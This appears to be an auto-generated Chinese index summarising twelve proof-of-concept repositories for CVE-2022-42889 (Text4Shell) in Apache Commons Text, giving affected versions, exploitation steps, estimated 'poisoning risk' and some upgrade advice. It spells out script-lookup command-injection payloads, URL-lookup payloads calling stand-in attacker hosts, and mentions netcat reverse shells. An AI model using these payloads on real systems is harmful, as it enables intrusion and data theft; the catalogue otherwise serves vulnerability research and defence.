# CVE-2022-42889

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-42889-34006133_CVE-2022-42889.md](../2022/CVE-2022-42889-34006133_CVE-2022-42889.md)

## CVE-2022-42889 Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给执行插值的函数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 (Text4Shell) 是一个 Apache Commons Text 库中的远程代码执行漏洞。该漏洞源于库中存在变量插值功能，允许动态评估和扩展属性。在 1.5 到 1.9 版本中，默认的 Lookup 实例包含一些插值器，例如 "script", "dns", 和 "url"，这些插值器可能导致任意代码执行或与远程服务器通信。如果应用程序使用这些默认插值器并且允许用户可控的输入进行插值，那么攻击者可以通过构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意代码。提供的漏洞利用代码 `main.go` 尝试构造一个包含恶意payload的URL，该URL包含一个 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload, 并通过HTTP GET请求发送到目标服务器。`possiblepoc.go` 文件似乎尝试创建一个反向shell。 根据代码分析,未发现作者隐藏的恶意投毒代码。利用方式：1. 确定目标应用程序正在使用受影响版本的 Apache Commons Text 并且暴露了允许用户输入进行插值的接口。2. 构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。3. 将构造的输入发送到目标应用程序，触发漏洞并执行任意代码。

**项目地址:** [34006133/CVE-2022-42889](https://github.com/34006133/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #2

**来源**: [CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md](../2022/CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md)

## CVE-2022-42889-Apache Commons Text-RCE/SSRF

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE) / 服务器端请求伪造 (SSRF)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行或服务器端请求伪造

**影响版本:** < 1.10.0 (1.5 <= version <= 1.9)

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户可控输入被用于文本插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text 1.5到1.9版本中的一个严重漏洞。该漏洞允许攻击者通过构造包含恶意表达式的字符串，利用文本插值功能执行任意代码（RCE）或发起服务器端请求伪造（SSRF）攻击。

**有效性分析：**

提供的POC代码是一个Python脚本，旨在测试目标系统是否存在Text4Shell漏洞。该脚本支持两种模式：

*   **RCE模式：** 利用`script`前缀，尝试执行JavaScript命令。具体而言，它使用Nashorn引擎（在Java 15及更高版本中默认禁用）来执行操作系统命令。如果目标系统启用了Nashorn引擎，则可能成功执行RCE攻击。
*   **SSRF模式：** 利用`url`前缀，尝试从指定的URL获取内容。这可能导致服务器向攻击者控制的服务器发出请求，从而泄露敏感信息或进行其他攻击。

根据NVD信息和搜索引擎结果，该漏洞影响Apache Commons Text 1.5到1.9版本，利用的关键在于应用程序是否接受用户可控的输入并将其传递给`StringSubstitutor.replace()`等插值方法。

因此，该POC代码在特定条件下是有效的。如果目标系统使用了受影响的Apache Commons Text版本，并且允许用户输入参与文本插值，那么攻击者就可以利用该漏洞。

**投毒风险分析：**

对提供的POC代码进行分析，可以发现其中存在轻微的投毒风险。虽然脚本本身的功能是测试漏洞，但如果攻击者修改脚本，例如：

*   **修改RCE命令：** 将测试命令替换为恶意命令，例如下载并执行恶意程序。
*   **修改SSRF URL：** 将SSRF目标URL替换为指向包含恶意内容的URL，例如包含恶意JavaScript代码的页面。
*   **增加额外功能** 添加未经授权的信息收集功能。

这些修改可能会导致用户在不知情的情况下受到攻击。

因此，评估的投毒风险为5%。主要集中在使用人员的安全意识上，是否存在下载后未进行代码审核直接执行的情况。

**利用方式：**

1.  **确定目标系统使用的Apache Commons Text版本是否在受影响范围内 (1.5-1.9)。**
2.  **找到应用程序中接受用户输入并使用Apache Commons Text进行文本插值的位置。**
3.  **构造包含恶意表达式的字符串，例如：**
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('malicious_command')}` (RCE，需要Nashorn引擎支持)
    *   `${url:UTF-8:http://attacker_controlled_server/resource}` (SSRF)
4.  **将构造的恶意字符串作为用户输入传递给应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或发起SSRF攻击。**

**项目地址:** [808ale/CVE-2022-42889-Text4Shell-POC](https://github.com/808ale/CVE-2022-42889-Text4Shell-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #3

**来源**: [CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户控制输入，该输入会被用于字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。该漏洞源于Apache Commons Text在1.5到1.9版本中，默认启用了一些不安全的StringLookup实现，如`script`，`dns`和`url`。当应用程序使用这些默认的Lookup实例并且允许用户控制输入时，攻击者可以通过构造恶意的字符串，利用变量插值功能执行任意代码。

**有效性分析：**

提供的POC代码是一个Spring Boot应用程序，它使用Apache Commons Text库进行字符串插值。`HelloController.java`文件中的`attack`方法接收一个名为`search`的请求参数，并使用`StringSubstitutor.createInterpolator()`创建一个插值器，然后使用`interpolator.replace(search)`方法对`search`参数进行插值。这意味着攻击者可以通过`search`参数传递恶意的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。`pom.xml`文件显示该项目使用了Apache Commons Text 1.8版本，属于受影响的版本范围。`README.md`文件提供了构建、运行和测试该POC应用程序的步骤，并提供了一个示例攻击payload。

根据漏洞信息和POC代码分析，该POC代码是有效的，可以用于演示和验证CVE-2022-42889漏洞。

**投毒风险分析：**

分析提供的代码，没有发现明显的投毒代码。该仓库的主要目的是为了演示CVE-2022-42889漏洞，代码结构清晰，功能单一，主要就是接收输入并利用commons-text进行解析。

**利用方式：**

1.  攻击者首先需要找到一个应用程序，该应用程序使用了受影响版本的Apache Commons Text库（1.5到1.9）。
2.  攻击者需要找到一个允许用户控制输入的地方，该输入会被传递给`StringSubstitutor.replace()`方法进行插值。
3.  攻击者构造一个包含恶意payload的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  攻击者将构造的恶意字符串作为输入传递给应用程序。
5.  应用程序使用`StringSubstitutor.replace()`方法对输入进行插值，从而执行攻击者指定的命令。

利用`dns`，攻击者可以构造payload让服务器解析恶意域名，从而进行信息收集或发起其他攻击。利用`url`，攻击者可以让服务器请求恶意URL，从而可能导致SSRF（服务器端请求伪造）漏洞。

**修复建议：**

升级到Apache Commons Text 1.10.0或更高版本。新版本默认禁用了`script`，`dns`和`url`等不安全的StringLookup实现。如果必须使用这些Lookup，请确保只在可信的环境中使用。

**项目地址:** [Dima2021/cve-2022-42889-text4shell](https://github.com/Dima2021/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #4

**来源**: [CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 1.9

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串参与到`${}`表达式的解析过程中

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是 Apache Commons Text 1.5 到 1.9 版本中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能。当应用程序使用这些版本的 Commons Text，并且将用户提供的、未经充分清理的数据传递给 StringSubstitutor.replace() 方法时，攻击者可以利用`${prefix:name}`格式的字符串注入恶意代码。

**有效性：**

提供的PoC 代码有效，它演示了如何利用该漏洞执行任意命令。PoC 代码包含了一个 Spring Boot 应用程序，该程序接受一个名为 `search` 的请求参数，并使用 `StringSubstitutor.replace()` 方法对其进行插值。通过构造包含`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 的恶意 payload，攻击者可以在服务器上执行任意命令。

**投毒风险：**

该仓库中作者隐藏的投毒代码可能性极低。`Dockerfile`、`pom.xml`和java源代码没有发现任何恶意行为。虽然存在远程代码执行漏洞，但这本身不是投毒。1%的风险在于构建脚本可能依赖于外部资源（例如，Maven仓库），这些资源可能在构建时被篡改，或者受到供应链攻击。但是，就提供的代码本身而言，它似乎没有包含故意的恶意代码。

**利用方式：**

1.  攻击者需要找到一个应用程序，该程序使用了存在漏洞的 Apache Commons Text 版本（<= 1.9）。
2.  攻击者需要在该应用程序中找到一个输入点（例如，HTTP 请求参数、表单字段等），该输入点允许攻击者控制将传递给 `StringSubstitutor.replace()` 方法的字符串。
3.  攻击者构造包含恶意`${prefix:name}` 表达式的 payload。`prefix` 可以是 `script`、`dns` 或 `url`。例如，可以使用 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 执行任意命令，使用 `${dns:address}` 解析恶意域名，或使用 `${url:UTF-8:url}` 从远程服务器加载数据。
4.  攻击者将 payload 传递给应用程序。
5.  应用程序使用 `StringSubstitutor.replace()` 方法处理 payload，导致恶意代码被执行。

**项目地址:** [DimaMend/cve-2022-42889-text4shell](https://github.com/DimaMend/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #5

**来源**: [CVE-2022-42889-Gotcha1G_CVE-2022-42889.md](../2022/CVE-2022-42889-Gotcha1G_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户可控的输入传递给文本插值功能

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中不安全的默认文本插值配置，允许攻击者通过构造包含恶意表达式的输入，利用`script`, `dns`, 或 `url` 等lookup执行任意代码或与远程服务器通信。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，此漏洞的利用是有效的。搜索引擎结果中的多个条目都将此漏洞描述为高危远程代码执行漏洞，并提供了利用示例。

**投毒风险：**
提供的PoC代码本身旨在验证漏洞的存在，通过`curl+{{interactsh-url}}`的方式来检测是否成功执行了命令。由于该PoC代码目的在于触发漏洞并进行验证，不包含恶意行为（例如：上传恶意文件、修改系统配置等），因此其主要风险在于被滥用进行攻击。但仓库中其他未提供的文件，可能存在隐藏的后门或恶意代码，因此综合判定存在10%的投毒风险。

**利用方式：**
攻击者将构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。这个字符串会被传递给使用了Apache Commons Text库进行文本插值的应用程序。如果应用程序没有对用户输入进行充分的验证和过滤，该表达式将被解析并执行，导致远程代码执行。PoC中使用了`curl`命令和`interactsh`服务来验证漏洞是否成功利用，实际攻击中可以替换成任何其他命令。

简而言之，利用方式是：
1.  应用程序使用存在漏洞的Apache Commons Text版本（<= 1.9）。
2.  应用程序允许用户可控的输入传递给文本插值功能。
3.  攻击者构造包含恶意表达式的输入。
4.  Apache Commons Text解析并执行恶意表达式，导致RCE。

**项目地址:** [Gotcha1G/CVE-2022-42889](https://github.com/Gotcha1G/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #6

**来源**: [CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-MendDemo-josh_cve-2022-42889-text4shell.md)

## CVE-2022-42889 Text4Shell

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意表达式的字符串，利用`script`, `dns` 或 `url` 等前缀，触发远程代码执行。该漏洞利用的有效性较高，因为提供的POC代码直接演示了如何使用`script`前缀执行`touch /tmp/foo`命令。Docker文件和README文件提供了构建和运行包含漏洞的应用程序的详细说明。尽管POC展示了RCE，但是仍然需要确认是否存在投毒风险，通过阅读所有提供的文件，没有发现任何隐藏的后门代码或其他恶意行为。Dockerfile文件用于构建包含漏洞应用程序的Docker镜像，pom.xml指定了所使用的commons-text版本为1.8，处于漏洞影响范围内。java代码也用于漏洞的验证。`HelloController.java` 暴露了一个 `/text4shell/attack` 的API接口，接收一个名为 `search` 的参数，并使用 `StringSubstitutor.replace()` 方法对其进行处理，从而导致漏洞。风险主要在于，这个demo程序是否会被滥用，作者是否会把这个程序用于攻击等等。 经过评估,作者投毒的可能性较小，但是仍然有一定的潜在风险，大约为10%。

**利用方式：**
1.  攻击者将特制的字符串（包含`${prefix:payload}`格式的恶意表达式）作为输入，传递给使用了`StringSubstitutor.replace()`方法的应用程序。
2.  `StringSubstitutor`会对字符串进行插值，如果`prefix`是`script`，`dns`或者`url`，则会调用相应的lookup来解析`payload`。
3.  `script`前缀允许执行任意的Java代码，`dns`前缀允许进行DNS查询，`url`前缀允许从URL加载内容，恶意构造的`payload`可以导致RCE或SSRF攻击。

**项目地址:** [MendDemo-josh/cve-2022-42889-text4shell](https://github.com/MendDemo-josh/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #7

**来源**: [CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md](../2022/CVE-2022-42889-QAInsights_cve-2022-42889-jmeter.md)

## CVE-2022-42889: Apache Commons Text RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的字符串进行变量插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 漏洞是 Apache Commons Text 库中一个远程代码执行漏洞，存在于 1.5 到 1.9 版本中。该漏洞源于库中存在不安全的默认变量插值配置，允许攻击者通过 `${prefix:name}` 格式的字符串执行任意代码或与远程服务器交互。其中，`prefix` 用于定位执行插值的 `org.apache.commons.text.lookup.StringLookup` 实例。存在风险的 `prefix` 包括 `script` (执行 JVM 脚本), `dns` (解析 DNS 记录), 和 `url` (从 URL 加载值)。

**有效性：**
根据漏洞描述、搜索结果和漏洞利用方式，该漏洞利用是有效的。搜索结果中多个链接表明该漏洞（又名 Text4Shell）是一个严重的安全问题，允许远程代码执行。

**投毒风险：**
提供的代码片段是 Apache License 的许可证文本，不包含任何可执行代码，因此不存在投毒风险。投毒风险评估为 0%。

**利用方式：**
1.  应用程序使用 Apache Commons Text 1.5 到 1.9 版本。
2.  应用程序接受用户提供的字符串，并使用该字符串进行变量插值，没有进行充分的过滤或安全处理。
3.  攻击者构造包含恶意 `prefix` 的字符串，例如 `${script:javascript code}` 或 `${url:http://malicious-server/evil.txt}`。
4.  Apache Commons Text 解析该字符串，并执行相应的操作，例如执行 JavaScript 代码或从恶意 URL 加载内容，从而导致远程代码执行或信息泄露。

**项目地址:** [QAInsights/cve-2022-42889-jmeter](https://github.com/QAInsights/cve-2022-42889-jmeter)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #8

**来源**: [CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-ReachabilityOrg_cve-2022-42889-text4shell-docker.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 1.9, >= 1.5

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户控制用于变量插值的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，又名Text4Shell，是一个存在于Apache Commons Text库中的远程代码执行漏洞。受影响的版本（1.5 到 1.9）中的默认插值器允许通过 `script`, `dns`, `url` 等前缀执行任意代码或与远程服务器建立连接。

**有效性：**

提供的POC代码是有效的，它展示了如何利用该漏洞。Dockerfile和pom.xml文件显示使用了易受攻击的Apache Commons Text 1.8版本。`README.md`文件提供了构建和运行POC应用程序的明确步骤，以及使用`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`有效负载触发RCE的示例。它尝试在/tmp/目录下创建一个文件来验证漏洞。

**投毒风险：**

该代码仓库中存在一些轻微的投毒风险的可能性。`whitesource.config`文件表明使用了 Whitesource，这是一种软件组合分析（SCA）工具。虽然这本身不是恶意行为，但可能表明作者试图隐藏某些依赖项或漏洞，或者他们正在使用自动化工具进行构建。代码结构较为简单，且RCE payload 明显，但仍需要对整个仓库进行细致的代码审计以完全确定是否还有其它隐藏的恶意代码，故判投毒比例为10%。

**利用方式：**

该漏洞的利用方式是通过构造包含恶意表达式的字符串，利用Apache Commons Text的字符串插值功能。攻击者可以将恶意表达式注入到应用程序使用的任何用户可控的输入中（例如，URL参数，POST数据等）。当应用程序使用`StringSubstitutor.createInterpolator()`并使用用户提供的输入执行插值时，恶意表达式将被执行。提供的POC使用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload在目标机器上执行任意命令。其他的利用方式可以使用`dns`或`url`前缀来尝试联系恶意服务器或执行其他操作。

**项目地址:** [ReachabilityOrg/cve-2022-42889-text4shell-docker](https://github.com/ReachabilityOrg/cve-2022-42889-text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #9

**来源**: [CVE-2022-42889-Sic4rio_CVE-2022-42889.md](../2022/CVE-2022-42889-Sic4rio_CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的 Apache Commons Text 版本，且允许用户可控的输入传递给 Commons Text 的文本插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个远程代码执行漏洞。该漏洞源于库中的变量插值功能，允许攻击者通过构造恶意输入，利用`script`, `dns`, 和 `url` 等 StringLookup 实现执行任意代码或与远程服务器进行交互。 

**有效性：**

根据漏洞信息、搜索结果和提供的POC代码，此漏洞利用是有效的。搜索结果中多个链接（例如：[webpage 1], [webpage 2], [webpage 4], [webpage 6], [webpage 9]）都表明此漏洞是远程代码执行漏洞，且危害严重。POC代码通过 `${script:javascript:java.lang.Runtime.getRuntime().exec(...) }` 构造恶意payload，利用 `script` StringLookup 执行系统命令，验证了漏洞的存在。

**投毒风险：**

提供的python POC代码主要功能是发送包含恶意payload的HTTP请求，payload会利用目标服务器上的java环境来执行命令。投毒代码分析如下：
*   代码的功能相对清晰，主要是构造payload发送请求，执行反弹shell。
*   风险点在于 `busybox nc` 命令，攻击者可能通过修改 IP 地址和端口来连接受害者的机器，但这是漏洞利用本身需要的，不能算是作者特意植入的后门。
*   虽然使用了`verify=False` 绕过了ssl证书校验，但这是为了方便测试自签名证书的情况，也属于正常情况。
*   代码中存在TerminalColors类，为输出添加颜色。这部分代码不会影响payload的执行，可以认为是正常的。

总体来看，代码本身并没有明显的恶意行为，但使用者需要注意，在未授权的情况下使用此脚本进行攻击属于非法行为。因此，投毒风险评估为5%。

**利用方式：**

1.  **确定目标：** 确定目标应用程序使用了存在漏洞的 Apache Commons Text 版本（1.5 到 1.9）。
2.  **构造Payload：**  构造包含恶意代码的字符串，利用`${prefix:name}` 格式进行变量插值。其中，`prefix` 可以是 `script`、`dns` 或 `url` 等，利用这些 StringLookup 实现执行命令或访问远程资源。
3.  **发送请求：**  将构造的恶意字符串作为输入，通过HTTP请求或其他方式发送给目标应用程序。该输入需要到达使用 Apache Commons Text 进行插值处理的地方。
4.  **执行代码：**  如果目标应用程序存在漏洞，Apache Commons Text 会解析恶意字符串，执行其中的代码。
5.  **反弹shell：**  POC中使用 `busybox nc` 命令反弹 shell，攻击者可以控制目标系统。

**项目地址:** [Sic4rio/CVE-2022-42889](https://github.com/Sic4rio/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #10

**来源**: [CVE-2022-42889-Syndicate27_text4shell-exploit.md](../2022/CVE-2022-42889-Syndicate27_text4shell-exploit.md)

## CVE-2022-42889 - Apache Commons Text 远程代码执行

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5 - 1.9)

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，且允许用户可控的输入参与 `${}` 格式的字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个影响 Apache Commons Text 1.5 到 1.9 版本的远程代码执行漏洞。该漏洞源于库中不安全的默认插值器，允许攻击者利用 'script'、'dns' 和 'url' 等前缀执行恶意代码。 

**有效性:**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。PoC 代码展示了如何使用 `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}` 构造恶意 payload，并通过 HTTP POST 请求发送到目标服务器，从而执行任意系统命令。

**投毒风险:**
分析 PoC 代码，未发现明显的投毒代码。该代码结构简单，主要功能是构造 payload 并发送 HTTP 请求。许可证和 README 文件也比较规范，没有可疑之处。因此，投毒风险评估为 0%。

**利用方式:**
1.  **确定目标应用:** 找到使用了存在漏洞的 Apache Commons Text 版本的 Java 应用程序，并且该应用允许用户控制的输入参与字符串插值。
2.  **构造 Payload:** 使用`${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`或类似的方式构造恶意 payload，其中 `...` 部分包含要执行的系统命令，如反弹 shell 等。
3.  **URL 编码:** 对构造好的 payload 进行 URL 编码，以确保其能够正确地通过 HTTP 请求传输。
4.  **发送请求:**  将编码后的 payload 嵌入到 HTTP 请求的参数中（如 GET 请求的查询参数或 POST 请求的 body），发送到目标应用程序。
5.  **监听连接:**  如果 payload 是反弹 shell，需要在攻击者机器上监听相应的端口，等待目标机器连接。

**修复建议:**
升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用了有问题的插值器。如果无法升级，可以考虑禁用或限制应用程序中使用的插值器，或者对用户输入进行严格的验证和过滤。

**项目地址:** [Syndicate27/text4shell-exploit](https://github.com/Syndicate27/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #11

**来源**: [CVE-2022-42889-aaronm-sysdig_text4shell-docker.md](../2022/CVE-2022-42889-aaronm-sysdig_text4shell-docker.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 1.9

**利用条件:** 应用程序使用Apache Commons Text <= 1.9，且允许用户可控的字符串进行变量插值

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个高危漏洞。该漏洞源于程序在处理用户提供的字符串时，使用了不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，利用`script`、`dns`或`url`等lookup前缀，执行任意代码。 

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞是有效的。漏洞利用代码中的Dockerfile-vuln和README.md文件清晰地展示了如何构建一个包含漏洞的应用程序，并使用特定的payload触发远程代码执行，例如创建`/tmp/foo`文件。

**投毒风险：**

该仓库的投毒风险较低，约为5%。 虽然不能完全排除作者隐藏恶意代码的可能性，但是从以下几点可以分析出，投毒的概率较低:

*   提供的代码主要是漏洞的演示和利用，重点在于复现漏洞本身。
*   Dockerfiles主要用于环境搭建，没有发现可疑的恶意命令。
*   pom-patched.xml修复了漏洞，pom-vuln.xml 包含漏洞，本身是用来复现漏洞的。
*   README.md 详细描述了利用步骤和验证方式，方便用户理解和测试。
*   azure-pipelines.yml 使用Sysdig进行安全扫描，表明作者可能关注安全性问题。

**可能的投毒方式（仅为假设）**:

*   在`src`目录下的Java代码中加入后门。
*   修改`pom.xml`，引入恶意的依赖项。
*   在Dockerfile中添加执行恶意命令的指令。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9之间的版本。
2.  应用程序允许用户提供字符串，这些字符串将被用于变量插值。
3.  攻击者构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中 `command` 是攻击者想要执行的系统命令。
4.  应用程序解析并执行该字符串，导致远程代码执行。

**缓解措施：**

1.  升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了存在风险的interpolator。
2.  如果无法升级，禁用或限制应用程序中使用的lookup，移除`script`、`dns`和`url`等lookup的默认配置。
3.  对用户提供的输入进行严格的验证和过滤，防止恶意表达式的注入。

**项目地址:** [aaronm-sysdig/text4shell-docker](https://github.com/aaronm-sysdig/text4shell-docker)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #12

**来源**: [CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md](../2022/CVE-2022-42889-adarshpv9746_Text4shell--Automated-exploit---CVE-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.10.0 (1.5-1.9)

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，并且允许用户可控的输入传递给文本插值函数

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889（又名Text4Shell）是Apache Commons Text库中的一个漏洞，它允许攻击者通过变量插值执行任意代码。该漏洞存在于1.5到1.9版本中。漏洞利用方式是，攻击者可以向应用程序提供包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。当应用程序使用Commons Text处理此输入时，该表达式将被解析和执行，从而导致远程代码执行。

**有效性评估：**
提供的POC代码似乎有效，因为它演示了如何使用`script`前缀执行任意命令。 Dockerfile 和 README.md 文件描述了如何构建和运行一个易受攻击的应用程序，`exploit.php` 文件构造了利用此漏洞的有效载荷。从搜索结果来看，该漏洞是一个高危漏洞，已经被广泛研究和利用。

**投毒风险分析：**
该仓库中存在潜在的投毒风险，但概率较低。以下是一些需要考虑的因素：

*   `install.sh` 和 `stop-app.sh` 脚本包含一些危险的命令，例如 `sudo` 命令以及`docker kill $(sudo docker ps -q)`。虽然这是为了快速启动和停止 docker 环境，但是也可能会被恶意使用，例如，如果攻击者控制了这些脚本，他们可以利用 `sudo` 命令来执行恶意操作。
*   `exploit.php` 文件中的 `$ip = "172.17.0.1";` 可能是一个陷阱。如果攻击者直接使用这段代码，他们的反向shell可能无法连接，从而暴露出攻击者。

考虑到作者的意图是演示漏洞利用，而并非恶意攻击，将此代码判定为投毒代码的概率为10%。

**利用方式：**
1.  构建和运行易受攻击的应用程序。
2.  构造包含恶意表达式的输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
3.  将此输入传递给应用程序的文本插值函数。
4.  表达式将被解析和执行，从而导致远程代码执行。`exploit.sh`和`exploit.php` 文件提供了一种自动化的利用方式，利用`nc`进行反弹shell。

**项目地址:** [adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889](https://github.com/adarshpv9746/Text4shell--Automated-exploit---CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #13
